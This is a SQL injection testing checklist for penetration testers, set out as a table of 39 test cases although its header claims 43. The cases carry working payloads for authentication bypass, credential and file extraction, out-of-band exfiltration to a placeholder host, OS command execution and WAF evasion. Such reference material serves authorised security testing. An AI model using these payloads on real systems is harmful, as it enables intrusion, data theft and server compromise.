# SQL Injection — Checklist

Expert per-attack **test-case matrix** for SQL Injection — in testing order, impact-first. All columns preserved (where to inject, steps, expected, payload, impact, severity, CVSS, tools, refs).

*43 test cases · spreadsheet grid — scroll sideways for all 12 columns.*

| Operation | Test Case Name | Test Category | Where to Test / Injection Point | Test Steps | Expected Result | Payload Example | Impact | Severity | CVSS | Tools | References |
|---|---|---|---|---|---|---|---|---|---|---|---|
| SQLI-001 | Enumerate every input that reaches SQL | Recon &amp; Sink Mapping | URL params, POST/form, JSON keys (incl. nested), cookies, logged headers | 1. Catalogue all inputs: query params, POST/form fields, JSON keys (including nested), cookies.<br>2. Include headers apps commonly log into SQL audit tables: User-Agent, Referer, X-Forwarded-For.<br>3. For each, note whether the value likely lands in a WHERE/ORDER BY/INSERT. | A complete list of parameters/headers that could reach a SQL query. | <code>id, q, search, sort, order, category, filter, limit, offset, user, User-Agent, X-Forwarded-For</code> | Defines the SQLi attack surface; logged headers are unauthenticated second-order sinks people miss. | Info | 0.0 (N/A) | Burp Suite Pro, Arjun, ParamSpider | CWE-89; OWASP WSTG-INPV-05; PortSwigger Web Security Academy: SQL injection |
| SQLI-002 | Prioritise high-yield sink types | Recon &amp; Sink Mapping | login/auth, search/filter, ?sort=/?order=, pagination, export/report, GraphQL/REST resolvers | 1. Rank sinks by likelihood: login/auth (auth bypass), search/filter/?id= (UNION/blind), ?sort=/?order= (identifier context), pagination ?limit/offset.<br>2. Add export/report/PDF builders (often string-built + higher privilege) and GraphQL/REST resolvers.<br>3. Test the identifier/sort slot even on 'parameterized' apps - values are bound but column names often are not. | A prioritised test order concentrating on the most exploitable contexts. | <code>?sort=1 vs ?sort=2   (identifier probe)<br>?limit=1 / ?offset=0   (pagination)</code> | Focuses effort; the ORDER BY/sort slot is routinely injectable where value-params are safely bound. | Info | 0.0 (N/A) | Burp Suite | CWE-89; PortSwigger Web Security Academy: SQL injection |
| SQLI-003 | Grep source/JS for string-built (non-parameterized) SQL | Recon &amp; Sink Mapping | Gray-box: source, JS bundles, ORM raw escape hatches | 1. Search for concatenated SQL: execute("..."+x), query(&#96;...${x}&#96;), knex.raw, sequelize.literal, order(params[:sort]), String.format into SQL, find_by_sql.<br>2. Flag ORM raw escape hatches and dynamic ORDER BY.<br>3. Map each hit to a reachable endpoint/parameter. | Identified code paths that build SQL by concatenation rather than binding. | <code>grep -rEn "raw\(&#124;literal\(&#124;execute\(.+\+&#124;query\(&#96;.+\$\{&#124;order\(params" .</code> | Pinpoints the exact injectable sinks and proves root cause for the report. | Info | 0.0 (N/A) | ripgrep, Semgrep, Burp | CWE-89; PortSwigger Web Security Academy: SQL injection |
| SQLI-004 | Flag second-order (stored-then-queried) sinks | Recon &amp; Sink Mapping | Values stored then later used in a query (username, display name, address, filename, comment) | 1. Identify inputs that are STORED then later used unsafely in a query by a different feature.<br>2. Common: registration username/display-name used by admin search/report; filename used by a job.<br>3. Plan to plant a payload now, trigger the consumer later. | A list of stored fields whose later consumption may be injectable. | <code>register username = tester' -&gt; later admin report runs ...WHERE name='tester'...</code> | Second-order SQLi bypasses input-facing WAFs and often runs at higher privilege. | Info | 0.0 (N/A) | Burp Suite | CWE-89; PortSwigger Web Security Academy: SQL injection |
| SQLI-005 | 60-second triage — break the query | Detection — Baseline | Any candidate parameter | 1. Send a normal value, then ' , " , ) , ') and the arithmetic test 2-1 vs<br>1. 2. Watch status / length / body / timing for each.<br>3. A SQL error, a changed page, or 2-1 returning the id=1 row signals injectability. | A quote/paren causes a SQL error or altered response, or 2-1 returns row 1 (numeric context). | <code>id=1'<br>id=1"<br>id=1)   id=1')<br>id=2-1   (returns the id=1 row =&gt; numeric, injectable)</code> | First, fast signal that a parameter reaches SQL and how the query is framed. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Repeater, curl | CWE-89; PortSwigger Web Security Academy: SQL injection; PayloadsAllTheThings/SQL Injection |
| SQLI-006 | Classify injection context | Detection — Baseline | Confirmed candidate parameter | 1. Decide the context: STRING ('...'), NUMERIC (id=1), IDENTIFIER (ORDER BY/column), or LIKE.<br>2. Confirm with a true/false pair matching the context.<br>3. Context dictates every payload that follows. | The parameter's SQL context is identified (string/numeric/identifier/LIKE). | <code>STRING: ' AND '1'='1  vs  ' AND '1'='2<br>NUMERIC: 1 AND 1=1  vs  1 AND 1=2<br>IDENTIFIER: ?sort=1 vs ?sort=2<br>LIKE: %' OR '1'='1'-- -</code> | Wrong context = wrong payload; correct classification makes exploitation deterministic. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Repeater | CWE-89; PortSwigger Web Security Academy: SQL injection |
| SQLI-007 | Fingerprint the DBMS | Detection — Baseline | Confirmed injection point | 1. Read error text; test concat behaviour: CONCAT (MySQL) vs &#124;&#124; (PG/Oracle/SQLite) vs + (MSSQL).<br>2. Test comment styles (# MySQL) and version functions.<br>3. Confirm with a DBMS-specific time delay (SLEEP vs pg_sleep vs WAITFOR). | The backend DBMS (MySQL/PostgreSQL/MSSQL/Oracle/SQLite) is identified. | <code>MySQL: ' AND SLEEP(5)-- -<br>PG: '; SELECT pg_sleep(5)-- -<br>MSSQL: '; WAITFOR DELAY '0:0:5'-- -<br>Oracle: dbms_pipe.receive_message</code> | DBMS choice determines the entire payload set for extraction, files, and RCE. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Repeater, sqlmap --fingerprint | CWE-89; PortSwigger Web Security Academy: SQL injection; HackTricks SQL injection |
| SQLI-008 | String-context breakout | Detection — Context Breakout | Value inside '...' in the query | 1. Close the string with ' and confirm error.<br>2. Comment the rest with '-- - (trailing space), '# or '/&#42;.<br>3. Prove boolean with ' AND '1'='1 (true) vs ' AND '1'='2 (false). | Quote closes the string (error), comment neutralises the rest, and the boolean pair differs. | <code>'-- -<br>' OR '1'='1'-- -<br>' AND '1'='1   vs   ' AND '1'='2</code> | Establishes control of a string-context query - the foundation for extraction/auth-bypass. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N) | Burp Repeater | CWE-89; PortSwigger Web Security Academy: SQL injection; PayloadsAllTheThings/SQL Injection |
| SQLI-009 | Numeric-context breakout | Detection — Context Breakout | Bare numeric value (id=1) | 1. Inject bare (no quote): 1 OR 1=1, 1 AND 1=2, 2-1.<br>2. Confirm 2-1 returns row 1 (math evaluated server-side).<br>3. Use 1 OR 1=1-- - to break out. | Arithmetic is evaluated and boolean conditions change the result set without any quote. | <code>1 OR 1=1-- -<br>1 AND 1=2<br>2-1   (= row 1)</code> | Numeric context needs no quote-escaping - often the cleanest injection to exploit. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N) | Burp Repeater | CWE-89; PortSwigger Web Security Academy: SQL injection |
| SQLI-010 | Paren/function-wrapper breakout | Detection — Context Breakout | Value inside func('INPUT') or nested parens | 1. The error reveals how many parens to close.<br>2. Try ')-- -, '))-- -, ') OR ('1'='1.<br>3. Balance parens then inject. | Closing the correct number of parentheses removes the error and lets the injected logic run. | <code>')-- -<br>'))-- -<br>') OR ('1'='1</code> | Handles wrapped queries (e.g. WHERE (col='x')) that a plain quote can't break. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N) | Burp Repeater | CWE-89; PortSwigger Web Security Academy: SQL injection; PayloadsAllTheThings/SQL Injection |
| SQLI-011 | Identifier-context injection (ORDER BY / column) | Detection — Context Breakout | ?sort=/?order=/column-name slots (NO quotes) - often missed on 'parameterized' apps | 1. Values may be bound but column/sort names are concatenated raw.<br>2. Column-index probe: ?sort=1 vs ?sort=2 (different ordering = injectable).<br>3. Boolean via ordering: (CASE WHEN (1=1) THEN name ELSE id END).<br>4. Time via subquery: (SELECT 1 FROM (SELECT SLEEP(5))x). | Different ordering per column index, or a CASE/subquery in the sort slot changes ordering/timing. | <code>?sort=(CASE WHEN (1=1) THEN name ELSE id END)<br>?sort=(SELECT 1 FROM (SELECT SLEEP(5))x)</code> | The identifier slot is injectable where value-params are safely bound - a frequently-overlooked win. | High | 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N) | Burp Repeater | CWE-89; PortSwigger Web Security Academy: SQL injection; PayloadsAllTheThings/SQL Injection |
| SQLI-012 | LIKE-context breakout | Detection — Context Breakout | Value inside LIKE 'INPUT%' | 1. Account for the trailing % wildcard.<br>2. Close the string and comment: %' OR '1'='1'-- -.<br>3. Confirm result-set change. | The LIKE clause is broken, injected logic runs, and results change. | <code>%' OR '1'='1'-- -</code> | Search boxes often use LIKE; this handles the extra wildcard the string breakout misses. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N) | Burp Repeater | CWE-89; PortSwigger Web Security Academy: SQL injection |
| SQLI-013 | Error-based extraction — MySQL | Detection — Error-Based | String/numeric sink where DB errors are shown | 1. Trigger extractvalue/updatexml to leak ~32 chars per shot.<br>2. Or use the floor(rand)&#42;2 count(&#42;) duplicate-key technique.<br>3. Iterate SUBSTRING to page through longer values. | The DB error message contains the queried value (version/user/database) after a ~ marker. | <code>' AND extractvalue(1,concat(0x7e,(SELECT @@version)))-- -<br>' AND updatexml(1,concat(0x7e,(SELECT user())),1)-- -</code> | Fast, reliable in-band extraction when verbose errors are shown - no blind guessing needed. | High | 8.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N) | Burp Repeater, sqlmap | CWE-89; PortSwigger Web Security Academy: SQL injection; PayloadsAllTheThings/SQL Injection |
| SQLI-014 | Error-based extraction — PostgreSQL | Detection — Error-Based | PG sink with errors shown | 1. Force a text-&gt;int cast error carrying the value.<br>2. Use string_agg to pull multiple rows into one error.<br>3. Iterate as needed. | The cast error message discloses version()/user data. | <code>' AND 1=CAST((SELECT version()) AS int)-- -<br>' AND 1=CAST((SELECT string_agg(usename,',') FROM pg_user) AS int)-- -</code> | In-band extraction on PostgreSQL via type-confusion errors. | High | 8.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N) | Burp Repeater, sqlmap | CWE-89; PortSwigger Web Security Academy: SQL injection |
| SQLI-015 | Error-based extraction — MSSQL | Detection — Error-Based | MSSQL sink with errors shown | 1. Force a conversion error that leaks the value.<br>2. Target sysobjects/sys.sql_logins for schema/creds.<br>3. Page with TOP/OFFSET. | The CONVERT error message discloses @@version or object/login names. | <code>' AND 1=CONVERT(int,(SELECT @@version))-- -<br>' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))-- -</code> | In-band extraction on MSSQL via conversion errors. | High | 8.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N) | Burp Repeater, sqlmap | CWE-89; PortSwigger Web Security Academy: SQL injection |
| SQLI-016 | Error-based extraction — Oracle | Detection — Error-Based | Oracle sink with errors shown | 1. Use UTL_INADDR.GET_HOST_NAME or CTXSYS.DRITHSX.SN to carry the value in an ORA error.<br>2. Add FROM dual and rownum=1 as required.<br>3. Iterate SUBSTR for longer values. | The ORA-error message contains the queried value. | <code>' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))-- -<br>' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))-- -</code> | In-band extraction on Oracle via error-carrying functions. | High | 8.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N) | Burp Repeater, sqlmap | CWE-89; PortSwigger Web Security Academy: SQL injection; PayloadsAllTheThings/SQL Injection |
| SQLI-017 | Boolean-based blind extraction | Detection — Blind (Boolean) | Silent sink with a stable true/false response difference | 1. Confirm AND 1=1 vs AND 1=2 give a stable, repeatable different response.<br>2. Binary-search length then chars: ASCII(SUBSTRING((SELECT database()),1,1))&gt;100.<br>3. Enumerate via count(&#42;) existence checks. | AND 1=1 and AND 1=2 yield consistently different responses; char comparisons page out data. | <code>' AND (SELECT LENGTH(@@version))&gt;10-- -<br>' AND ASCII(SUBSTRING((SELECT database()),1,1))&gt;100-- -</code> | Full data extraction with no errors and no visible output - works on most 'silent' sinks. | High | 8.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N) | Burp Intruder, sqlmap, poc/sqli_blind.py | CWE-89; PortSwigger Web Security Academy: SQL injection; PayloadsAllTheThings/SQL Injection |
| SQLI-018 | Time-based blind — MySQL | Detection — Blind (Time) | Fully blind sink (no error, no boolean diff), MySQL | 1. Confirm SLEEP(5) delays while SLEEP(0) is fast, repeatably.<br>2. Make it conditional to extract: IF(condition,SLEEP(5),0).<br>3. Binary-search chars via the delay oracle. | SLEEP(5) delays ~5s consistently; SLEEP(0) returns fast - a reliable timing oracle. | <code>' AND SLEEP(5)-- -<br>' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))&gt;100,SLEEP(5),0)-- -</code> | Extraction when the only signal is response time - the last-resort but universal blind method. | High | 8.1 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:L/A:L) | Burp Intruder, sqlmap, poc/sqli_blind.py | CWE-89; PortSwigger Web Security Academy: SQL injection |
| SQLI-019 | Time-based blind — PostgreSQL | Detection — Blind (Time) | Fully blind sink, PostgreSQL | 1. Confirm pg_sleep(5) delay.<br>2. Conditional via CASE WHEN.<br>3. Binary-search extraction. | pg_sleep(5) delays consistently under the injected condition. | <code>'; SELECT pg_sleep(5)-- -<br>' AND 1=(CASE WHEN(1=1) THEN(SELECT 1 FROM pg_sleep(5)) ELSE 1 END)-- -</code> | Universal blind extraction on PostgreSQL. | High | 8.1 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:L/A:L) | Burp Intruder, sqlmap | CWE-89; PortSwigger Web Security Academy: SQL injection |
| SQLI-020 | Time-based blind — MSSQL | Detection — Blind (Time) | Fully blind sink, MSSQL | 1. Confirm WAITFOR DELAY '0:0:5' delay.<br>2. Conditional via IF.<br>3. Extract char-by-char. | WAITFOR DELAY causes a consistent delay under the injected condition. | <code>'; WAITFOR DELAY '0:0:5'-- -<br>' IF(1=1) WAITFOR DELAY '0:0:5'-- -</code> | Universal blind extraction on MSSQL. | High | 8.1 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:L/A:L) | Burp Intruder, sqlmap | CWE-89; PortSwigger Web Security Academy: SQL injection |
| SQLI-021 | Time-based blind — Oracle | Detection — Blind (Time) | Fully blind sink, Oracle | 1. Use dbms_pipe.receive_message for a timed wait.<br>2. Conditional via CASE WHEN.<br>3. Extract via the delay oracle. | dbms_pipe.receive_message delays under the injected condition. | <code>' AND 1=(CASE WHEN(1=1) THEN dbms_pipe.receive_message(('a'),5) ELSE 1 END)-- -</code> | Universal blind extraction on Oracle. | High | 8.1 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:L/A:L) | Burp Intruder, sqlmap | CWE-89; PortSwigger Web Security Academy: SQL injection; PayloadsAllTheThings/SQL Injection |
| SQLI-022 | UNION-based — determine column count | Detection — UNION | In-band sink where results are rendered | 1. Climb ORDER BY N until it errors (count = N-1).<br>2. Or add NULLs: UNION SELECT NULL, NULL,... until no error (exact count).<br>3. Oracle needs FROM dual. | ORDER BY errors at N, or UNION SELECT NULLxN stops erroring at the exact column count. | <code>' ORDER BY 1-- -   ' ORDER BY 2-- -  ...<br>' UNION SELECT NULL-- -   ' UNION SELECT NULL,NULL-- -  ...</code> | Column count is the prerequisite for UNION data extraction. | High | 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N) | Burp Repeater, sqlmap | CWE-89; PortSwigger Web Security Academy: SQL injection |
| SQLI-023 | UNION-based — extract data via visible column | Detection — UNION | In-band sink, column count known | 1. Find a visible string column by rotating a marker: UNION SELECT 'a',NULL,...<br>2. Concatenate target data into it (CONCAT/&#124;&#124;/+ per DBMS; GROUP_CONCAT/string_agg to pack rows).<br>3. Pull version() and one benign row first. | The injected marker/data appears in the response in the visible column position. | <code>' UNION SELECT CONCAT(user,0x3a,authentication_string),NULL FROM mysql.user-- -<br>' UNION SELECT usename&#124;&#124;':'&#124;&#124;passwd,NULL FROM pg_shadow-- -</code> | Direct, fast in-band data theft (versions, schema, credentials) once a visible column is found. | Critical | 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N) | Burp Repeater, sqlmap | CWE-89; PortSwigger Web Security Academy: SQL injection; PayloadsAllTheThings/SQL Injection |
| SQLI-024 | Out-of-band (OOB) extraction | Detection — OOB | Fully blind/firewalled sink; DBMS with OOB primitives | 1. Get a Collaborator/interactsh host; put database()/user as the SUBDOMAIN.<br>2. MSSQL xp_dirtree/xp_fileexist (DNS/SMB); Oracle UTL_INADDR/DBMS_LDAP; PG COPY..TO PROGRAM nslookup; MySQL(Win) LOAD_FILE UNC.<br>3. Read the DNS log - one hit carrying database() = proof. | An OOB DNS/HTTP callback arrives carrying the exfiltrated value as a subdomain. | <code>'; EXEC master..xp_dirtree '\\'+(SELECT @@version)+'.$COLLAB\a'-- -<br>' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)&#124;&#124;'.$COLLAB')) IS NOT NULL-- -</code> | Extracts data when there is no in-band or timing signal - irrefutable, fast proof. | High | 8.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N) | Burp Collaborator, interactsh, sqlmap | CWE-89; PortSwigger Web Security Academy: SQL injection; HackTricks SQL injection |
| SQLI-025 | Stacked queries — detect &amp; use | Detection — Stacked | Drivers allowing multiple statements (PG/MSSQL/SQLite; usually not mysqli) | 1. Test a delay on a SECOND statement: '; SELECT pg_sleep(5)-- - or '; WAITFOR DELAY '0:0:5'-- -.<br>2. If it delays, stacking is enabled.<br>3. Use for writes/RCE ONLY on your own test row, benignly. | A delay from the second statement confirms stacked queries execute. | <code>'; SELECT pg_sleep(5)-- -<br>'; WAITFOR DELAY '0:0:5'-- -</code> | Stacked queries unlock writes, xp_cmdshell, and COPY..FROM PROGRAM - the path to RCE. | High | 8.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N) | Burp Repeater, sqlmap | CWE-89; PortSwigger Web Security Academy: SQL injection |
| SQLI-026 | Authentication bypass | Impact — Auth Bypass | Login builds WHERE user='$u' AND pass='$p' | 1. Comment out the password: admin'-- - (or admin'# / admin'/&#42;).<br>2. Always-true first/any user: ' OR 1=1 LIMIT 1-- -.<br>3. Target a user: admin' AND '1'='1'-- -. Numeric id login: 1 OR 1=1-- -.<br>4. Note which account you land as (admin = Critical). | You authenticate without valid credentials, landing as an existing (ideally admin) account. | <code>admin'-- -<br>' OR 1=1 LIMIT 1-- -<br>admin' AND '1'='1'-- -</code> | Direct account takeover; as admin it is full application compromise. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Repeater | CWE-89; CWE-287; PortSwigger Web Security Academy: SQL injection; PayloadsAllTheThings/SQL Injection |
| SQLI-027 | Schema enumeration | Impact — Data Disclosure | Any working extraction technique | 1. DBs: information_schema.schemata (MSSQL sys.databases; Oracle all_tables; SQLite sqlite_master).<br>2. Tables in current DB; then columns of interesting tables (users/accounts/admin/auth).<br>3. Locate password/password_hash/passwd columns. | Database/table/column names are enumerated, revealing where credentials/PII live. | <code>SELECT table_name FROM information_schema.tables WHERE table_schema=database()<br>SELECT column_name FROM information_schema.columns WHERE table_name='users'</code> | Maps the database and pinpoints sensitive tables for a targeted, bounded proof. | High | 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N) | Burp Repeater, sqlmap | CWE-89; PortSwigger Web Security Academy: SQL injection |
| SQLI-028 | Bounded data extraction (benign proof) | Impact — Data Disclosure | Confirmed extraction technique + located sensitive table | 1. Pull version() plus ONE benign sample row and a COUNT - never the whole table.<br>2. Redact secrets in the report.<br>3. Describe the full-dump impact without performing it. | version() plus a single sample row and row count are retrieved as proof. | <code>' UNION SELECT @@version,NULL-- -<br>' UNION SELECT CONCAT(email,0x3a,LEFT(password_hash,6)),NULL FROM users LIMIT 1-- -</code> | Proves mass data theft (PII/credentials) with a safe, bounded PoC - Critical if hashes/PII exposed. | High | 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N) | Burp Repeater, sqlmap (--dump limited) | CWE-89; PortSwigger Web Security Academy: SQL injection; OWASP WSTG-INPV-05 |
| SQLI-029 | File read — MySQL LOAD_FILE | Impact — File Read | MySQL with FILE priv + permissive secure_file_priv | 1. Read a benign file to prove: LOAD_FILE('/etc/passwd').<br>2. Then config/source: /var/www/html/config.php, .env.<br>3. Concatenate into a visible/UNION column. | The file contents are returned in the response. | <code>' UNION SELECT LOAD_FILE('/etc/passwd'),NULL-- -<br>' UNION SELECT LOAD_FILE('/var/www/html/config.php'),NULL-- -</code> | Local file disclosure (configs, secrets, source) - often reveals DB creds and further bugs. | High | 8.6 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N) | Burp Repeater, sqlmap --file-read | CWE-89; PortSwigger Web Security Academy: SQL injection; PayloadsAllTheThings/SQL Injection |
| SQLI-030 | File read — PostgreSQL / MSSQL / Oracle | Impact — File Read | PG superuser / MSSQL bulk-ops / Oracle directory object | 1. PG: pg_read_file('/etc/passwd',0,100000) or COPY t FROM '/etc/passwd'.<br>2. MSSQL: OPENROWSET(BULK '/etc/passwd',SINGLE_CLOB).<br>3. Oracle: UTL_FILE.GET_LINE on a DIRECTORY object. | The target file's contents are returned. | <code>SELECT pg_read_file('/etc/passwd',0,100000)<br>' UNION SELECT BulkColumn,NULL FROM OPENROWSET(BULK '/etc/passwd',SINGLE_CLOB) x-- -</code> | Local file disclosure across the non-MySQL engines - configs, secrets, source code. | High | 8.6 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N) | Burp Repeater, sqlmap | CWE-89; PortSwigger Web Security Academy: SQL injection; HackTricks SQL injection |
| SQLI-031 | File write -&gt; webshell (benign PoC) | Impact — File Write | MySQL INTO OUTFILE / PG COPY TO, with write priv + known web-served dir | 1. Prereqs: write priv + known absolute webroot + that dir is web-served + file funcs enabled.<br>2. Write a BENIGN marker (random token) to s.txt and fetch it over HTTP to prove write+serve.<br>3. Do NOT drop a live shell on a bounty target. | A benign marker file is written to the webroot and retrievable over HTTP. | <code>' UNION SELECT '&lt;benign-token&gt;',NULL INTO OUTFILE '$WEBROOT/marker.txt'-- -<br>'; COPY (SELECT '&lt;benign-token&gt;') TO '$WEBROOT/marker.txt'-- -</code> | Proves arbitrary file write to the webroot - one step from RCE, demonstrated safely. | Critical | 9.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N) | Burp Repeater | CWE-89; CWE-73; PortSwigger Web Security Academy: SQL injection; PayloadsAllTheThings/SQL Injection |
| SQLI-032 | RCE — MSSQL xp_cmdshell | Impact — RCE | MSSQL sysadmin + stacked queries | 1. Enable if needed: sp_configure 'xp_cmdshell',1; RECONFIGURE.<br>2. Run ONE benign command: xp_cmdshell 'whoami'.<br>3. Capture one line (inline/temp-table/OOB), then STOP. | The output of a single benign OS command (whoami) is returned. | <code>'; EXEC master..xp_cmdshell 'whoami'-- -</code> | Remote code execution on the DB server - Critical; lead the report with it. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Repeater, sqlmap --os-shell | CWE-89; CWE-78; PortSwigger Web Security Academy: SQL injection; HackTricks SQL injection |
| SQLI-033 | RCE — PostgreSQL COPY..FROM PROGRAM | Impact — RCE | PG superuser &gt;=9.3 (CVE-2019-9193), stacked queries | 1. CREATE TABLE cmd(o text); COPY cmd FROM PROGRAM 'id'; SELECT o FROM cmd.<br>2. Capture one benign line, then STOP.<br>3. Alt: untrusted PL/Python or PL/Perl. | The output of a single benign command (id) is returned via the table. | <code>'; CREATE TABLE cmd(o text); COPY cmd FROM PROGRAM 'id'; SELECT o FROM cmd-- -</code> | Remote code execution on PostgreSQL - Critical. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Repeater, sqlmap | CWE-89; CWE-78; PostgreSQL CVE-2019-9193; PortSwigger Web Security Academy: SQL injection |
| SQLI-034 | RCE — MySQL UDF / Oracle scheduler | Impact — RCE | MySQL FILE+writable plugin_dir / Oracle DBMS_SCHEDULER or Java proc | 1. MySQL (high bar): write lib_mysqludf_sys.so via INTO DUMPFILE, CREATE FUNCTION sys_exec, SELECT sys_exec('id').<br>2. Oracle: DBMS_SCHEDULER / Java stored proc runtime.exec (privilege-dependent).<br>3. Usually easier on MySQL: file-write -&gt; webshell. | A single benign command executes via the UDF/scheduler. | <code>SELECT sys_exec('id');   -- MySQL UDF<br>BEGIN DBMS_SCHEDULER.CREATE_JOB(...); END;   -- Oracle</code> | RCE on MySQL/Oracle where privileges allow - Critical. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Repeater, sqlmap, metasploit | CWE-89; CWE-78; HackTricks SQL injection; PayloadsAllTheThings/SQL Injection |
| SQLI-035 | Privilege check (DBA/superuser) | Impact — Privilege &amp; Lateral | Confirmed SQLi, any DBMS | 1. MySQL: super_priv from mysql.user / current_user().<br>2. PG: current_setting('is_superuser').<br>3. MSSQL: IS_SRVROLEMEMBER('sysadmin').<br>4. Oracle: session_privs for DBA. | The current DB user's privilege level (DBA/superuser or not) is determined. | <code>' AND IS_SRVROLEMEMBER('sysadmin')=1-- -<br>' AND (SELECT current_setting('is_superuser'))='on'-- -</code> | Determines whether file R/W and RCE are reachable - sets the severity ceiling. | Medium | 6.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N) | Burp Repeater, sqlmap --privileges | CWE-89; PortSwigger Web Security Academy: SQL injection |
| SQLI-036 | Lateral movement — MSSQL linked servers | Impact — Privilege &amp; Lateral | MSSQL with linked servers configured | 1. Enumerate linked servers.<br>2. OPENQUERY to run on the linked instance: SELECT &#42; FROM OPENQUERY([LINKEDSRV],'SELECT @@version').<br>3. EXEC ... AT [LINKEDSRV] for RCE; document reach without pivoting out of scope. | Queries/commands execute on a linked SQL server, revealing lateral reach. | <code>'; SELECT &#42; FROM OPENQUERY([LINKEDSRV],'SELECT @@version')-- -<br>'; EXEC ('xp_cmdshell ''whoami''') AT [LINKEDSRV]-- -</code> | Lateral movement across the SQL estate - can chain to RCE on other hosts. | High | 8.9 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:L) | Burp Repeater, mssqlclient.py | CWE-89; HackTricks SQL injection |
| SQLI-037 | Second-order SQLi | Impact — Second-Order | Stored field later used unsafely by another feature (admin search/report) | 1. Plant a time/OOB payload in a stored field (username, address, filename).<br>2. Trigger the consumer (admin search, report, batch job).<br>3. Confirm the delay/callback fires when the stored value is queried. | The payload stored earlier executes when a later feature builds a query from it. | <code>register username = tester' AND SLEEP(5)-- -   then trigger admin search of users</code> | Bypasses input-facing WAFs and often runs at higher privilege - high-impact, hard to detect. | High | 8.2 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:N) | Burp Collaborator, manual | CWE-89; PortSwigger Web Security Academy: SQL injection; PayloadsAllTheThings/SQL Injection |
| SQLI-038 | Keyword-filter evasion (UNION/SELECT) | Evasion — WAF/Filter | WAF/filter blocking SQL keywords | 1. Inline comments: UN/&#42;&#42;/ION, SE/&#42;&#42;/LECT; MySQL versioned /&#42;!50000UNION&#42;/.<br>2. Case: uNiOn SeLeCt.<br>3. Doubled keyword if the WAF strips once: UNIUNIONON. | The obfuscated keyword reaches the DB and executes though the raw keyword is blocked. | <code>' UN/&#42;&#42;/ION SE/&#42;&#42;/LECT NULL-- -<br>' /&#42;!50000UNION&#42;/ /&#42;!SELECT&#42;/ NULL-- -</code> | Bypasses signature WAFs to restore UNION/extraction on 'protected' endpoints. | High | 7.5 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:L/A:N) | Burp Repeater, sqlmap --tamper | CWE-89; PortSwigger Web Security Academy: SQL injection; PayloadsAllTheThings/SQL Injection |
| SQLI-039 | Whitespace &amp; quote/encoding evasion | Evasion — WAF/Filter | Filters blocking spaces or quotes | 1. Space blocked: /&#42;&#42;/, %09/%0a/%0b/%0c/%0d, or UNION(SELECT(1)).<br>2. Quote blocked: hex 0x61646d696e, CHAR()/CHR() per DBMS.<br>3. Double-encode %2527 where the stack decodes twice. | The payload survives the filter via alternative whitespace/encoding and still executes. | <code>' OR 0x61646d696e=0x61646d696e-- -<br>'/&#42;&#42;/OR/&#42;&#42;/1=1-- -<br>id=1%09AND%091=1</code> | Defeats space/quote filters that block only the literal characters. | High | 7.5 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:L/A:N) | Burp Repeater, CyberChef, sqlmap --tamper | CWE-89; PayloadsAllTheThings/SQL Injection |
